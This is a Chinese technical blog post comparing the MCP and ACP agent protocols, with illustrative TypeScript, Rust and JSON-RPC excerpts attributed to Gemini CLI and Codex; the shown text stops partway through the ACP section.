del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Multi-Agent 协作的基石：协议标准化探索之路</h2>
<blockquote>
<p>基于 Google Gemini CLI 和 OpenAI Codex 源码的深度技术剖析</p>
<p><strong>源码版本说明</strong>
本文基于以下版本的源码分析：</p>
<ul>
<li><strong>Gemini CLI</strong>: v0.10.0-nightly (2025-10-13)</li>
<li><strong>Codex CLI</strong>: v0.2.0-alpha.2 (2025-11-25)</li>
<li><strong>MCP 协议</strong>: 2025-06-18 规范</li>
</ul>
</blockquote>
<h3 data-id="heading-1">摘要</h3>
<ul>
<li>随着 AI Agent 的快速发展，如何让不同的 Agent 之间高效协作、如何标准化 Agent 与外部工具的交互，已成为业界关注的焦点。</li>
<li>本文通过深入分析 <strong>Google Gemini CLI</strong> 和 <strong>OpenAI Codex</strong> 的源码实现，对比两大主流协议——<strong>MCP (Model Context Protocol)</strong> 和 <strong>ACP (Agent Context Protocol)</strong> 的设计理念、技术架构和应用场景，并探讨 AI Agent 协议的未来发展方向。</li>
</ul>
<hr/>
<h3 data-id="heading-2">一、协议背景：为什么需要标准化？</h3>
<h4 data-id="heading-3">1.1 当前 AI Agent 生态的痛点</h4>
<p>在协议标准化之前，AI Agent 面临以下核心挑战：</p>






























<table><thead><tr><th>痛点</th><th>描述</th><th>影响</th></tr></thead><tbody><tr><td><strong>孤岛效应</strong></td><td>每个 Agent 使用私有协议，无法互操作</td><td>无法构建 Multi-Agent 系统</td></tr><tr><td><strong>工具集成困难</strong></td><td>每个工具需要为不同 Agent 重复开发适配器</td><td>开发成本高，生态碎片化</td></tr><tr><td><strong>状态不可恢复</strong></td><td>会话状态无法持久化或跨系统传递</td><td>用户体验差，无法长期任务</td></tr><tr><td><strong>安全性缺失</strong></td><td>缺乏统一的权限控制和审计机制</td><td>企业级部署存在风险</td></tr></tbody></table>
<h4 data-id="heading-4">1.2 协议标准化的价值</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph before["标准化前：N × M 问题"]
        A1["Agent1"] --&gt; T1A["Tool1 (适配器 1-1)"]
        A1 --&gt; T2A["Tool2 (适配器 1-2)"]
        A1 --&gt; T3A["Tool3 (适配器 1-3)"]

        A2["Agent2"] --&gt; T1B["Tool1 (适配器 2-1)"]
        A2 --&gt; T2B["Tool2 (适配器 2-2)"]
        A2 --&gt; T3B["Tool3 (适配器 2-3)"]

        style before fill:#ffebee,stroke:#c62828
    end

    subgraph after["标准化后：N + M 问题"]
        Agent1["Agent1"] --&gt; Protocol["MCP/ACP 协议层"]
        Agent2["Agent2"] --&gt; Protocol
        Agent3["Agent3"] --&gt; Protocol

        Protocol --&gt; Tool1["Tool1"]
        Protocol --&gt; Tool2["Tool2"]
        Protocol --&gt; Tool3["Tool3"]

        style after fill:#e8f5e9,stroke:#2e7d32
        style Protocol fill:#fff3e0,stroke:#e65100
    end
</code></pre>
<p><strong>对比结果</strong>:</p>
<ul>
<li><strong>标准化前</strong>: 需要 <strong>N × M</strong> 个适配器 (每个 Agent 为每个 Tool 开发专用适配器)</li>
<li><strong>标准化后</strong>: 仅需 <strong>N + M</strong> 个适配器 (Agent 实现协议 + Tool 实现协议)</li>
</ul>
<hr/>
<h3 data-id="heading-5">二、MCP (Model Context Protocol) 深度解析</h3>
<h4 data-id="heading-6">2.1 MCP 协议概述</h4>
<p><strong>MCP</strong> 由 Anthropic 提出，是一个专注于 <strong>Agent 与外部工具/资源交互</strong> 的标准协议。</p>
<p><strong>核心设计理念</strong>:</p>
<ul>
<li>📦 <strong>资源抽象</strong>: 将外部系统（数据库、API、文件系统）抽象为统一的 Resource</li>
<li>🔧 <strong>工具调用</strong>: 标准化的工具发现、调用和响应流程</li>
<li>🔌 <strong>传输无关</strong>: 支持 stdio、SSE、HTTP 等多种传输方式</li>
<li>🔐 <strong>权限控制</strong>: 内置的工具执行审批机制</li>
</ul>
<p><strong>协议版本</strong>: <code>2025-06-18</code> (来源: Codex <code>mcp-types/src/lib.rs</code>)</p>
<h4 data-id="heading-7">2.2 Gemini CLI 的 MCP 实现架构</h4>
<h5 data-id="heading-8"><strong>核心组件</strong>:</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/src/tools/mcp-client.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">McpClient</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">client</span>: <span class="hljs-title class_">Client</span>;                    <span class="hljs-comment">// MCP SDK Client</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">transport</span>: <span class="hljs-title class_">Transport</span>;              <span class="hljs-comment">// 传输层 (stdio/SSE/HTTP)</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">status</span>: <span class="hljs-title class_">MCPServerStatus</span>;           <span class="hljs-comment">// 连接状态</span>

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">connect</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-comment">// 1. 建立传输连接</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">transport</span> = <span class="hljs-title function_">createTransport</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">serverConfig</span>);

    <span class="hljs-comment">// 2. 初始化 MCP Client</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Client</span>({
      <span class="hljs-attr">name</span>: <span class="hljs-string">'gemini-cli'</span>,
      <span class="hljs-attr">version</span>: <span class="hljs-string">'0.10.0'</span>
    }, {
      <span class="hljs-attr">capabilities</span>: {
        <span class="hljs-attr">roots</span>: { <span class="hljs-attr">listChanged</span>: <span class="hljs-literal">true</span> },
        <span class="hljs-attr">sampling</span>: {}
      }
    });

    <span class="hljs-comment">// 3. 连接到 MCP Server</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">connect</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">transport</span>);
  }

  <span class="hljs-keyword">async</span> <span class="hljs-title function_">discover</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-comment">// 发现工具</span>
    <span class="hljs-keyword">const</span> tools = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">listTools</span>();

    <span class="hljs-comment">// 发现资源</span>
    <span class="hljs-keyword">const</span> resources = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">listResources</span>();

    <span class="hljs-comment">// 发现 Prompts</span>
    <span class="hljs-keyword">const</span> prompts = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">client</span>.<span class="hljs-title function_">listPrompts</span>();
  }
}
</code></pre>
<h5 data-id="heading-9"><strong>工具调用流程</strong>:</h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// packages/core/src/tools/mcp-tool.ts</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DiscoveredMCPToolInvocation</span> {
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">execute</span>(<span class="hljs-attr">signal</span>: <span class="hljs-title class_">AbortSignal</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ToolResult</span>&gt; {
    <span class="hljs-comment">// 1. 检查是否需要用户批准</span>
    <span class="hljs-keyword">const</span> confirmationDetails = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">shouldConfirmExecute</span>(signal);
    <span class="hljs-keyword">if</span> (confirmationDetails) {
      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">waitForUserApproval</span>(confirmationDetails);
    }

    <span class="hljs-comment">// 2. 调用 MCP Tool</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">functionCalls</span>: <span class="hljs-title class_">FunctionCall</span>[] = [{
      <span class="hljs-attr">name</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">serverToolName</span>,
      <span class="hljs-attr">args</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">params</span>
    }];

    <span class="hljs-keyword">const</span> rawResponseParts = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">mcpTool</span>.<span class="hljs-title function_">callToolBatch</span>(
      functionCalls,
      signal
    );

    <span class="hljs-comment">// 3. 处理响应</span>
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">parseToolResponse</span>(rawResponseParts);
  }
}
</code></pre>
<h4 data-id="heading-10">2.3 Codex 的 MCP 实现架构</h4>
<h5 data-id="heading-11"><strong>核心组件</strong> (基于 Rust):</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// codex-rs/core/src/mcp_connection_manager.rs</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">McpConnectionManager</span> {
    clients: HashMap&lt;<span class="hljs-type">String</span>, AsyncManagedClient&gt;,
    elicitation_requests: ElicitationRequestManager,
    tool_timeout: Duration,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">McpConnectionManager</span> {
    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">connect_server</span>(
        &amp;<span class="hljs-keyword">self</span>,
        server_name: <span class="hljs-type">String</span>,
        config: McpServerConfig
    ) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;()&gt; {
        <span class="hljs-comment">// 1. 创建 RmcpClient (Rust MCP Client)</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">client</span> = RmcpClient::<span class="hljs-title function_ invoke__">new</span>(
            Implementation {
                name: <span class="hljs-string">"codex"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
                version: <span class="hljs-built_in">env!</span>(<span class="hljs-string">"CARGO_PKG_VERSION"</span>).<span class="hljs-title function_ invoke__">to_string</span>(),
            },
            ClientCapabilities {
                roots: <span class="hljs-title function_ invoke__">Some</span>(RootsCapability { list_changed: <span class="hljs-literal">true</span> }),
                sampling: <span class="hljs-title function_ invoke__">Some</span>(SamplingCapability {}),
            },
        );

        <span class="hljs-comment">// 2. 建立传输连接</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">transport</span> = <span class="hljs-keyword">match</span> &amp;config.transport {
            StdioTransport =&gt; <span class="hljs-title function_ invoke__">create_stdio_transport</span>(config),
            SseTransport =&gt; <span class="hljs-title function_ invoke__">create_sse_transport</span>(config),
        };

        <span class="hljs-keyword">await</span> client.<span class="hljs-title function_ invoke__">connect</span>(transport)?;

        <span class="hljs-comment">// 3. 列举并限定工具</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">tools</span> = client.<span class="hljs-title function_ invoke__">list_tools</span>().<span class="hljs-keyword">await</span>?;
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">qualified_tools</span> = <span class="hljs-keyword">self</span>.<span class="hljs-title function_ invoke__">qualify_tools</span>(server_name, tools);

        <span class="hljs-title function_ invoke__">Ok</span>(())
    }
}
</code></pre>
<h5 data-id="heading-12"><strong>工具名称限定 (Fully Qualified Names)</strong>:</h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// codex-rs/core/src/mcp_connection_manager.rs</span>
<span class="hljs-keyword">const</span> MCP_TOOL_NAME_DELIMITER: &amp;<span class="hljs-type">str</span> = <span class="hljs-string">"__"</span>;
<span class="hljs-keyword">const</span> MAX_TOOL_NAME_LENGTH: <span class="hljs-type">usize</span> = <span class="hljs-number">64</span>;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">qualify_tools</span>(tools: <span class="hljs-type">Vec</span>&lt;ToolInfo&gt;) <span class="hljs-punctuation">-&gt;</span> HashMap&lt;<span class="hljs-type">String</span>, ToolInfo&gt; {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">qualified_tools</span> = HashMap::<span class="hljs-title function_ invoke__">new</span>();

    <span class="hljs-keyword">for</span> <span class="hljs-variable">tool</span> <span class="hljs-keyword">in</span> tools {
        <span class="hljs-comment">// 格式: mcp__&lt;server_name&gt;__&lt;tool_name&gt;</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">qualified_name</span> = <span class="hljs-built_in">format!</span>(
            <span class="hljs-string">"mcp{}{}{}{}"</span>,
            MCP_TOOL_NAME_DELIMITER,
            tool.server_name,
            MCP_TOOL_NAME_DELIMITER,
            tool.tool_name
        );

        <span class="hljs-comment">// 超长则使用 SHA1 截断</span>
        <span class="hljs-keyword">if</span> qualified_name.<span class="hljs-title function_ invoke__">len</span>() &gt; MAX_TOOL_NAME_LENGTH {
            <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">hash</span> = sha1::Sha1::<span class="hljs-title function_ invoke__">digest</span>(qualified_name.<span class="hljs-title function_ invoke__">as_bytes</span>());
            qualified_name = <span class="hljs-built_in">format!</span>(<span class="hljs-string">"{}_{:x}"</span>,
                &amp;qualified_name[..<span class="hljs-number">48</span>],
                hash
            );
        }

        qualified_tools.<span class="hljs-title function_ invoke__">insert</span>(qualified_name, tool);
    }

    qualified_tools
}
</code></pre>
<h4 data-id="heading-13">2.4 MCP 协议消息示例</h4>
<h5 data-id="heading-14"><strong>工具列表请求</strong>:</h5>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"method"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tools/list"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"params"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h5 data-id="heading-15"><strong>工具列表响应</strong>:</h5>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"result"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"tools"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"read_file"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"description"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Read contents of a file"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"inputSchema"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"object"</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"properties"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
            <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"string"</span> <span class="hljs-punctuation">}</span>
          <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">"required"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"path"</span><span class="hljs-punctuation">]</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h5 data-id="heading-16"><strong>工具调用请求</strong>:</h5>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"method"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"tools/call"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"params"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"read_file"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"arguments"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"path"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/etc/hosts"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h5 data-id="heading-17"><strong>工具调用响应</strong>:</h5>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"jsonrpc"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"result"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
      <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"text"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"127.0.0.1 localhost\n::1 localhost"</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"isError"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-18">三、ACP (Agent Client Protocol) 官方标准深度解析</h3>
<h4 data-id="heading-19">3.1 ACP 协议概述</h4>
<p><strong>ACP (Agent Client Protocol)</strong> 是由 <strong>Zed Industries</strong> 在 <strong>2025 年 8 月</strong>正式发布的开放标准，旨在标准化<strong>代码编辑器/IDE 与 AI 编码代理之间的通信</strong>。</p>
<blockquote>
<p>📖 <strong>官方资源</strong></p>
<ul>
<li>官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fagentclientprotocol.com%2F" target="_blank" title="https://agentclientprotocol.com/" ref="nofollow noopener noreferrer">agentclientprotocol.com/</a></li>
<li>GitHub：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fagentclientprotocol%2Fagent-client-protocol" target="_blank" title="https://github.com/agentclientprotocol/agent-client-protocol" ref="nofollow noopener noreferrer">github.com/agentclient…</a></li>
<li>TypeScript SDK：<code>@agentclientprotocol/sdk</code> (npm)</li>
<li>协议版本：<strong>Version 1</strong> (当前)</li>
</ul>
</blockquote>
<p><strong>核心定位</strong>:
ACP 类似于 <strong>LSP (Language Server Protocol)</strong> 在语言服务器领域的作用，解决了 Agent-Editor 集成的 <strong>N×M 问题</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    subgraph before["ACP 之前：N × M 集成问题"]
        E1["Editor1"] --&gt; A1A["Agent1 (定制集成)"]
        E1 --&gt; A2A["Agent2 (定制集成)"]
        E1 --&gt; A3A["Agent3 (定制集成)"]

        E2["Editor2"] --&gt; A1B["Agent1 (重复开发)"]
        E2 --&gt; A2B["Agent2 (重复开发)"]

        style before fill:#ffebee,stroke:#c62828
    end

    subgraph after["ACP 之后：N + M 标准化"]
        Editor1["Editor1"] --&gt; ACP["ACP 协议层"]
        Editor2["Editor2"] --&gt; ACP
        Editor3["Editor3"] --&gt; ACP

        ACP --&gt; Agent1["Agent1"]
        ACP --&gt; Agent2["Agent2"]
        ACP --&gt; Agent3["Agent3"]

        style after fill:#e8f5e9,stroke:#2e7d32
